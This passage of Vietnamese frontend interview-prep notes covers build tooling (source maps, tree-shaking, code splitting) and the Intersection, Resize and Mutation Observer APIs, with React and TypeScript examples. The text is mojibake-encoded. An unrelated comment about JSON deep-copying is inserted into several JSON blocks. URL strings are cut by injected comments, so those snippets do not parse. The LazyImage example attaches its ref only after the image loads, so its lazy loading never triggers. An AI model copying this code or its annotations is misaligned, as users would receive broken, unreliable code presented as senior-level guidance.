   ```json
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
   {
     "lint-staged": {
       "*.{ts,tsx}": ["eslint --fix", "prettier --write"]
     }
   }
   ```

2. **Source Maps**

   - ‚úÖ Development: `eval-source-map` (fast rebuild)
   - ‚úÖ Production: `source-map` ho·∫∑c `hidden-source-map`
   - ‚úÖ Deploy .map files ri√™ng (kh√¥ng public) ‚Üí b·∫£o m·∫≠t
   - ‚úÖ Set `sourceMapFilename` ƒë·ªÉ serve t·ª´ CDN ri√™ng

3. **Tree-shaking**

   - ‚úÖ D√πng ESM (`import/export`), KH√îNG d√πng CommonJS
   - ‚úÖ Set `sideEffects: false` trong package.json
   - ‚úÖ Named exports thay v√¨ default exports
   - ‚úÖ Import tr·ª±c ti·∫øp, tr√°nh barrel exports (`index.ts`)
   - ‚úÖ Check bundle size: `npm run build -- --analyze`

4. **Code Splitting**

   - ‚úÖ Route-based splitting (React Router, Next.js pages)
   - ‚úÖ Component-based splitting (lazy load heavy components)
   - ‚úÖ Vendor splitting (separate React, libraries...)
   - ‚úÖ Set `Suspense` fallback cho UX t·ªët
   - ‚úÖ Prefetch critical chunks: `<link rel="prefetch">`

5. **TypeScript Strict Mode**
   ```json
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
   {
     "compilerOptions": {
       "strict": true, // Ch√∫ gi·∫£i: Enable t·∫•t c·∫£ strict checks
       "noUncheckedIndexedAccess": true, // Ch√∫ gi·∫£i: Check array/object access
       "noImplicitReturns": true, // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
       "noFallthroughCasesInSwitch": true // Ch√∫ gi·∫£i: Switch case ph·∫£i break
     }
   }
   ```

---

**Common Mistakes:**

1. **‚ùå ESLint + Prettier Conflict**

   ```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: ESLint format rules conflict v·ªõi Prettier
   // .eslintrc.js (KH√îNG d√πng indent, quotes rules)
   {
     rules: {
       'indent': ['error', 2], // Ch√∫ gi·∫£i: ‚ùå Conflict v·ªõi Prettier
       'quotes': ['error', 'single'] // Ch√∫ gi·∫£i: ‚ùå Conflict v·ªõi Prettier
     }
   }

   // ‚úÖ GOOD: D√πng eslint-config-prettier
   {
     extends: ['prettier'] // T·∫Øt format rules
   }
   ```

2. **‚ùå Source Maps trong Production**

   ```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: Public source maps ‚Üí leak source code
 // Ch√∫ gi·∫£i: webpack.config.js
   {
     devtool: 'source-map', // Ch√∫ gi·∫£i: .map files public
   }

   // ‚úÖ GOOD: Hidden source maps ho·∫∑c serve ri√™ng
   {
     devtool: 'hidden-source-map', // Kh√¥ng reference trong bundle
     output: {
       sourceMapFilename: '[file].map',
       publicPath: 'https: // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
     }
   }
   ```

3. **‚ùå Tree-shaking Kh√¥ng Ho·∫°t ƒë·ªông**

   ```typescript
   // ‚ùå BAD: CommonJS ‚Üí tree-shaking KH√îNG work
   const utils = require('./utils'); // Ch√∫ gi·∫£i: CommonJS

 // Ch√∫ gi·∫£i: ‚ùå BAD: Default export + destructure
   export default { add, subtract, multiply };
   import utils from './utils';
   const { add } = utils; // Ch√∫ gi·∫£i: Bundle ch·ª©a c·∫£ subtract, multiply

 // Ch√∫ gi·∫£i: ‚ùå BAD: Barrel exports v·ªõi side-effects
 // Ch√∫ gi·∫£i: index.ts
   export * from './moduleA'; // moduleA c√≥ side-effects

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Named exports + ESM
   export function add(a, b) {
     return a + b;
   }
   import { add } from './utils'; // Ch√∫ gi·∫£i: Ch·ªâ bundle add()
   ```

4. **‚ùå Code Splitting Qu√° Nhi·ªÅu**

   ```typescript
   // ‚ùå BAD: Split qu√° nh·ªè ‚Üí nhi·ªÅu HTTP requests
   const Button = lazy(() => import('./Button')); // ‚ùå Component nh·ªè kh√¥ng n√™n split
   const Icon = lazy(() => import('./Icon')); // ‚ùå Qu√° nh·ªè

   // ‚úÖ GOOD: Ch·ªâ split components/routes n·∫∑ng
   const Dashboard = lazy(() => import('./pages/Dashboard')); // ‚úÖ Page n·∫∑ng
   const ChartLibrary = lazy(() => import('./ChartLibrary')); // ‚úÖ Library n·∫∑ng (500KB+)
   ```

5. **‚ùå Path Alias Ph√° Tree-shaking**

   ```typescript
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
   {
     "paths": {
       "@utils/*": ["./src/utils/*"]
     }
   }

 // Ch√∫ gi·∫£i: ‚ùå BAD: Import t·ª´ barrel file
   import { add } from '@utils'; // Ch√∫ gi·∫£i: ‚Üí import from index.ts (barrel)
   // Tree-shaking k√©m v√¨ ph·∫£i load to√†n b·ªô index.ts

   // ‚úÖ GOOD: Import tr·ª±c ti·∫øp
   import { add } from '@utils/math'; // ‚Üí import tr·ª±c ti·∫øp
   ```

6. **‚ùå Qu√™n Set `sideEffects`**

   ```json
   // ‚ùå BAD: Kh√¥ng set sideEffects
 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
   {} // Bundler assume M·ªåI module c√≥ side-effects

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Explicit declare
   {
     "sideEffects": false // Ho·∫∑c ["*.css", "polyfills.ts"]
   }
   ```

7. **‚ùå Dynamic Import Kh√¥ng C√≥ Error Handling**

   ```typescript
   // ‚ùå BAD: Kh√¥ng handle error
   const mod = await import('./module'); // N·∫øu fail ‚Üí crash app

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Handle error
   try {
     const mod = await import('./module');
     mod.doSomething();
   } catch (error) {
     console.error('Failed to load module:', error);
 // Ch√∫ gi·∫£i: Fallback logic
   }
   ```

---
---
## 34. üëÅÔ∏è Q34: Observer APIs - Intersection, Resize, Mutation Observer  

**P1: T√™n c√¢u h·ªèi:** üëÅÔ∏è Q34: Observer APIs - Intersection, Resize, Mutation Observer  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Observer APIs (IntersectionObserver, ResizeObserver, MutationObserver) theo d√µi DOM changes hi·ªáu qu·∫£ h∆°n event listeners, ch·∫°y async, kh√¥ng block main thread."**

**üîë 3 Observer APIs:**

**1. IntersectionObserver - Lazy Loading & Visibility:**
- Theo d√µi element **v√†o/ra viewport** (ho·∫∑c ancestor container)
- Use case: **Lazy load images**, infinite scroll, analytics (viewability tracking)
- Thay th·∫ø: `scroll` event + `getBoundingClientRect()` (performance t·ªìi!)
- Options: `threshold` (0-1), `rootMargin` (offset viewport)

**2. ResizeObserver - Responsive Components:**
- Theo d√µi **thay ƒë·ªïi k√≠ch th∆∞·ªõc element** (width/height)
- Use case: Responsive charts, grid layouts, container queries
- Thay th·∫ø: `window.resize` event (ch·ªâ detect window, kh√¥ng detect element resize)
- Tr√°nh layout thrashing - browser optimize batch updates

**3. MutationObserver - DOM Changes:**
- Theo d√µi **DOM tree modifications** (add/remove nodes, attribute changes)
- Use case: Auto-init third-party widgets, debug, accessibility tools
- Thay th·∫ø: Mutation Events (deprecated - synchronous, performance t·ªìi)
- Options: `childList`, `attributes`, `characterData`, `subtree`

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Qu√™n `disconnect()` khi unmount ‚Üí memory leak
- MutationObserver trong callback modify DOM ‚Üí **infinite loop** (observe ch√≠nh m√¨nh)
- D√πng `scroll` event thay IntersectionObserver ‚Üí jank, battery drain
- ResizeObserver kh√¥ng debounce ‚Üí fire qu√° nhi·ªÅu, t·ª± debounce n·∫øu c·∫ßn

**üí° Ki·∫øn Th·ª©c Senior:**
- **Performance**: Observers ch·∫°y **async** trong requestIdleCallback-like phase ‚Üí kh√¥ng block rendering
- **Batching**: Browser batch nhi·ªÅu observations, callback nh·∫≠n array entries
- **IntersectionObserver v2**: Th√™m `isVisible` flag (check occlusion, opacity, filters)
- **Container Queries** (CSS) d√πng ResizeObserver internally
- **Best practice**: 1 observer cho nhi·ªÅu elements (reuse) thay v√¨ 1 observer/element




**‚ùì C√¢u H·ªèi:****

Observer APIs l√† g√¨? Khi n√†o v√† t·∫°i sao n√™n d√πng ch√∫ng thay v√¨ event listeners truy·ªÅn th·ªëng?


**‚úÖ ƒê√°p √Ån Chi Ti·∫øt:**

**üéØ T·ªïng Quan Observer APIs:**

Observer APIs l√† nh√≥m Web APIs hi·ªán ƒë·∫°i cho ph√©p **theo d√µi (observe) c√°c thay ƒë·ªïi** trong DOM m·ªôt c√°ch **b·∫•t ƒë·ªìng b·ªô v√† hi·ªáu qu·∫£** m√† kh√¥ng c·∫ßn polling hay event listeners li√™n t·ª•c.

**3 Observer APIs Quan Tr·ªçng:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    OBSERVER APIs                              ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                               ‚îÇ
‚îÇ  1Ô∏è‚É£ INTERSECTION OBSERVER (Quan s√°t giao ƒëi·ªÉm)              ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Theo d√µi element v√†o/ra kh·ªèi viewport                 ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Use cases: Lazy loading, Infinite scroll, Analytics   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Thay th·∫ø: scroll event + getBoundingClientRect()      ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                               ‚îÇ
‚îÇ  2Ô∏è‚É£ RESIZE OBSERVER (Quan s√°t thay ƒë·ªïi k√≠ch th∆∞·ªõc)          ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Theo d√µi thay ƒë·ªïi k√≠ch th∆∞·ªõc c·ªßa element              ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Use cases: Responsive components, Charts, Layouts     ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Thay th·∫ø: window.resize event + polling               ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                               ‚îÇ
‚îÇ  3Ô∏è‚É£ MUTATION OBSERVER (Quan s√°t thay ƒë·ªïi DOM)               ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Theo d√µi thay ƒë·ªïi DOM tree (add/remove/modify)        ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Use cases: Auto-init, Debug, Third-party integration  ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Thay th·∫ø: Mutation Events (deprecated)                ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

**üîç 1. INTERSECTION OBSERVER API (Quan S√°t Giao ƒêi·ªÉm)**

**Kh√°i ni·ªám:**
- API theo d√µi khi m·ªôt element **xu·∫•t hi·ªán, bi·∫øn m·∫•t ho·∫∑c giao nhau** v·ªõi viewport (ho·∫∑c m·ªôt element cha)
- S·ª≠ d·ª•ng cho: Lazy loading images, Infinite scroll, Visibility tracking, Analytics

**Ho·∫°t ƒë·ªông:**
1. T·∫°o observer v·ªõi callback function
2. ƒêƒÉng k√Ω c√°c elements c·∫ßn theo d√µi
3. Callback ƒë∆∞·ª£c g·ªçi **b·∫•t ƒë·ªìng b·ªô** khi element v√†o/ra kh·ªèi v√πng quan s√°t
4. Browser engine t·ª± t·ªëi ∆∞u, kh√¥ng c·∫ßn poll/scroll listener li√™n t·ª•c

**∆Øu ƒëi·ªÉm:**
- ‚úÖ **Hi·ªáu nƒÉng cao**: Kh√¥ng block main thread, browser t·ªëi ∆∞u internally
- ‚úÖ **API ƒë∆°n gi·∫£n**: D·ªÖ s·ª≠ d·ª•ng h∆°n scroll event + getBoundingClientRect()
- ‚úÖ **Linh ho·∫°t**: H·ªó tr·ª£ threshold (ng∆∞·ª°ng %), rootMargin (trigger s·ªõm/mu·ªôn)
- ‚úÖ **Gi·∫£m layout thrashing**: Kh√¥ng g√¢y reflow/repaint nh∆∞ getBoundingClientRect()

**Nh∆∞·ª£c ƒëi·ªÉm:**
- ‚ö†Ô∏è Callback b·∫•t ƒë·ªìng b·ªô ‚Üí kh√¥ng ƒë·∫£m b·∫£o timing ch√≠nh x√°c ƒë·∫øn pixel
- ‚ö†Ô∏è C·∫ßn polyfill cho browsers r·∫•t c≈© (IE11-)
- ‚ö†Ô∏è Kh√¥ng ph√π h·ª£p cho logic c·∫ßn ƒë·ªìng b·ªô ch√≠nh x√°c

**Code Example (TypeScript + React):**

```typescript
import { useEffect, useRef, useState } from 'react';

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: A. LAZY LOADING IMAGES (T·∫£i ·∫¢nh L∆∞·ªùi)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch: Ch·ªâ t·∫£i ·∫£nh khi user scroll ƒë·∫øn g·∫ßn ‚Üí ti·∫øt ki·ªám bandwidth, tƒÉng t·ªëc ƒë·ªô load trang

function LazyImage({ src, alt }: { src: string; alt: string }) {
  const imgRef = useRef<HTMLImageElement>(null);
  const [imageSrc, setImageSrc] = useState<string>(''); // Ch√∫ gi·∫£i: ·∫¢nh th·∫≠t ch∆∞a load
  const [isLoaded, setIsLoaded] = useState(false);
  
  useEffect(() => {
 // Ch√∫ gi·∫£i: T·∫°o Intersection Observer
    const observer = new IntersectionObserver(
      (entries) => {
        // entries: Danh s√°ch c√°c elements ƒëang ƒë∆∞·ª£c observe
        entries.forEach((entry) => {
          // entry.isIntersecting: true = element xu·∫•t hi·ªán trong viewport
          if (entry.isIntersecting && !isLoaded) {
            console.log('‚úÖ Image v√†o viewport, b·∫Øt ƒë·∫ßu load:', src);
            
 // Ch√∫ gi·∫£i: Load ·∫£nh th·∫≠t
            setImageSrc(src);
            setIsLoaded(true);
            
            // Ng·ª´ng observe sau khi load (kh√¥ng c·∫ßn theo d√µi n·ªØa)
            observer.unobserve(entry.target);
          }
        });
      },
      {
        root: null, // null = observe trong viewport (m√†n h√¨nh)
        
        // rootMargin: M·ªü r·ªông v√πng observe
        // '50px' = trigger khi element c√≤n c√°ch viewport 50px
        // ‚Üí Preload ·∫£nh tr∆∞·ªõc khi user nh√¨n th·∫•y (UX m∆∞·ª£t h∆°n)
        rootMargin: '50px',
        
        // threshold: Ng∆∞·ª°ng % element hi·ªÉn th·ªã ƒë·ªÉ trigger callback
 // Ch√∫ gi·∫£i: 0.1 = trigger khi 10% element visible
        threshold: 0.1
      }
    );
    
    // B·∫Øt ƒë·∫ßu observe image element
    if (imgRef.current) {
      observer.observe(imgRef.current);
    }
    
 // Ch√∫ gi·∫£i: Cleanup: Disconnect observer khi component unmount
    return () => {
      observer.disconnect();
    };
  }, [src, isLoaded]);
  
  return (
    <div className="lazy-image-container">
      {!imageSrc ? (
 // Ch√∫ gi·∫£i: Placeholder khi ch∆∞a load (skeleton)
        <div className="skeleton-loader" style={{ width: '100%', height: 300, background: '#e0e0e0' }}>
          <span>ƒêang t·∫£i...</span>
        </div>
      ) : (
        <img 
          ref={imgRef}
          src={imageSrc} 
          alt={alt}
          onLoad={() => console.log('‚úÖ Image ƒë√£ load xong')}
        />
      )}
    </div>
  );
}

 // Ch√∫ gi·∫£i: S·ª≠ d·ª•ng:
function Gallery() {
  const images = [
    'https: // Ch√∫ gi·∫£i: example.com/image1.jpg',
    'https: // Ch√∫ gi·∫£i: example.com/image2.jpg',
 // Ch√∫ gi·∫£i: ... 100+ images
  ];
  
  return (
    <div className="gallery">
      {images.map((src, i) => (
        <LazyImage key={i} src={src} alt={`Image ${i + 1}`} />
      ))}
    </div>
  );
}
// K·∫øt qu·∫£: Ch·ªâ load 5-10 ·∫£nh ƒë·∫ßu ti√™n (trong viewport) thay v√¨ 100+ ·∫£nh c√πng l√∫c
 // Ch√∫ gi·∫£i: ‚Üí Trang load nhanh h∆°n 10x!

 // Ch√∫ gi·∫£i: ============================================
// B. INFINITE SCROLL (Cu·ªôn V√¥ H·∫°n)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch: T·ª± ƒë·ªông load th√™m data khi user scroll ƒë·∫øn cu·ªëi danh s√°ch

interface Order {
  id: string;
  symbol: string;
  price: number;
}

function InfiniteOrderList() {
  const [orders, setOrders] = useState<Order[]>([]);
  const [page, setPage] = useState(1);
  const [hasMore, setHasMore] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  
  // Ref cho sentinel element (ph·∫ßn t·ª≠ "canh g√°c" ·ªü cu·ªëi list)
  const sentinelRef = useRef<HTMLDivElement>(null);
  
 // Ch√∫ gi·∫£i: Load more data
  const loadMoreOrders = async () => {
    if (isLoading || !hasMore) return;
    
    setIsLoading(true);
    console.log(`üì• ƒêang load page ${page}...`);
    
    try {
      const res = await fetch(`/api/orders?page=${page}&limit=20`);
      const newOrders = await res.json();
      
      if (newOrders.length === 0) {
        setHasMore(false); // H·∫øt data
        console.log('‚úÖ ƒê√£ load h·∫øt orders');
      } else {
        setOrders(prev => [...prev, ...newOrders]);
        setPage(prev => prev + 1);
        console.log(`‚úÖ Load th√†nh c√¥ng ${newOrders.length} orders`);
      }
    } catch (error) {
      console.error('‚ùå L·ªói load orders:', error);
    } finally {
      setIsLoading(false);
    }
  };
  
  useEffect(() => {
 // Ch√∫ gi·∫£i: T·∫°o observer cho sentinel element
    const observer = new IntersectionObserver(
      (entries) => {
        const sentinel = entries[0];
        
        // Khi sentinel xu·∫•t hi·ªán trong viewport ‚Üí load more
        if (sentinel.isIntersecting && hasMore && !isLoading) {
          console.log('üîÑ Sentinel v√†o viewport ‚Üí Load more...');
          loadMoreOrders();
        }
      },
      {
        root: null,
        rootMargin: '100px', // Trigger s·ªõm 100px (load tr∆∞·ªõc khi user scroll ƒë·∫øn cu·ªëi)
        threshold: 0
      }
    );
    
    if (sentinelRef.current) {
      observer.observe(sentinelRef.current);
    }
    
    return () => observer.disconnect();
  }, [hasMore, isLoading, page]);
  
 // Ch√∫ gi·∫£i: Load initial data
  useEffect(() => {
    loadMoreOrders();
  }, []);
  
  return (
    <div className="order-list">
      <h2>üìã Orders (Infinite Scroll)</h2>
      
      {orders.map((order) => (
        <div key={order.id} className="order-item">
          <span>{order.symbol}</span>
          <span>${order.price}</span>
        </div>
      ))}
      
      {/* Sentinel element: Ph·∫ßn t·ª≠ "canh g√°c" ·ªü cu·ªëi list */}
      <div ref={sentinelRef} style={{ height: 20 }}>
        {isLoading && <span>‚è≥ ƒêang t·∫£i th√™m...</span>}
        {!hasMore && <span>‚úÖ ƒê√£ hi·ªÉn th·ªã t·∫•t c·∫£</span>}
      </div>
    </div>
  );
}
// C√°ch ho·∫°t ƒë·ªông:
 // Ch√∫ gi·∫£i: 1. User scroll xu·ªëng
// 2. Sentinel element v√†o viewport
 // Ch√∫ gi·∫£i: 3. Observer trigger ‚Üí loadMoreOrders()
// 4. Fetch data m·ªõi, append v√†o list
// 5. L·∫∑p l·∫°i cho ƒë·∫øn khi h·∫øt data

 // Ch√∫ gi·∫£i: ============================================
// C. VISIBILITY TRACKING (Theo D√µi Hi·ªÉn Th·ªã)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch: Track % element hi·ªÉn th·ªã ‚Üí g·ª≠i analytics
// VD: Bi·∫øt ƒë∆∞·ª£c section n√†o user ƒë·ªçc nhi·ªÅu nh·∫•t

function VisibilityTracker({ children, id }: { children: React.ReactNode; id: string }) {
  const elementRef = useRef<HTMLDivElement>(null);
  const [visibilityPercentage, setVisibilityPercentage] = useState(0);
  
  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          // intersectionRatio: T·ª∑ l·ªá % element hi·ªÉn th·ªã (0.0 - 1.0)
          const percentage = Math.round(entry.intersectionRatio * 100);
          setVisibilityPercentage(percentage);
          
          console.log(`üëÅÔ∏è Section "${id}" hi·ªÉn th·ªã: ${percentage}%`);
          
 // Ch√∫ gi·∫£i: G·ª≠i analytics khi >50% visible
          if (percentage > 50) {
 // Ch√∫ gi·∫£i: analytics.track('section_viewed', { id, percentage });
          }
        });
      },
      {
        root: null,
        threshold: [0, 0.25, 0.5, 0.75, 1.0] // Track ·ªü nhi·ªÅu m·ª©c: 0%, 25%, 50%, 75%, 100%
      }
    );
    
    if (elementRef.current) {
      observer.observe(elementRef.current);
    }
    
    return () => observer.disconnect();
  }, [id]);
  
  return (
    <div ref={elementRef} className="tracked-section">
      <div className="visibility-indicator">
        Hi·ªÉn th·ªã: {visibilityPercentage}%
      </div>
      {children}
    </div>
  );
}

 // Ch√∫ gi·∫£i: S·ª≠ d·ª•ng:
function Article() {
  return (
    <article>
      <VisibilityTracker id="section-1">
        <h2>Ph·∫ßn 1: Gi·ªõi thi·ªáu</h2>
        <p>N·ªôi dung...</p>
      </VisibilityTracker>
      
      <VisibilityTracker id="section-2">
        <h2>Ph·∫ßn 2: Ph√°t tri·ªÉn</h2>
        <p>N·ªôi dung...</p>
      </VisibilityTracker>
    </article>
  );
}
```

**Best Practices (Th·ª±c H√†nh T·ªët):**

1. **‚úÖ D√πng `rootMargin` ƒë·ªÉ preload s·ªõm**
   ```typescript
   rootMargin: '50px' // Load tr∆∞·ªõc khi v√†o viewport 50px ‚Üí UX m∆∞·ª£t
   ```

2. **‚úÖ Unobserve sau khi x·ª≠ l√Ω xong**
   ```typescript
   if (entry.isIntersecting) {
     // X·ª≠ l√Ω...
     observer.unobserve(entry.target); // Ng·ª´ng observe ‚Üí ti·∫øt ki·ªám t√†i nguy√™n
   }
   ```

3. **‚úÖ D√πng multiple thresholds cho tracking chi ti·∫øt**
   ```typescript
   threshold: [0, 0.25, 0.5, 0.75, 1] // Track ·ªü 5 m·ª©c ƒë·ªô
   ```

4. **‚úÖ K·∫øt h·ª£p v·ªõi native lazy loading**
   ```html
   <img src="image.jpg" loading="lazy" /> <!-- Browser native lazy load -->
   ```

**Common Mistakes (L·ªói Th∆∞·ªùng G·∫∑p):**

```typescript
// ‚ùå L·ªñI 1: D√πng scroll event + getBoundingClientRect() (ch·∫≠m, g√¢y layout thrashing)
window.addEventListener('scroll', () => {
  images.forEach((img) => {
    const rect = img.getBoundingClientRect(); // Ch√∫ gi·∫£i: ‚ùå Trigger reflow m·ªói scroll
    if (rect.top < window.innerHeight) {
 // Ch√∫ gi·∫£i: Load image...
    }
  });
});

// ‚úÖ S·ª¨A: D√πng IntersectionObserver (t·ªëi ∆∞u, kh√¥ng block main thread)
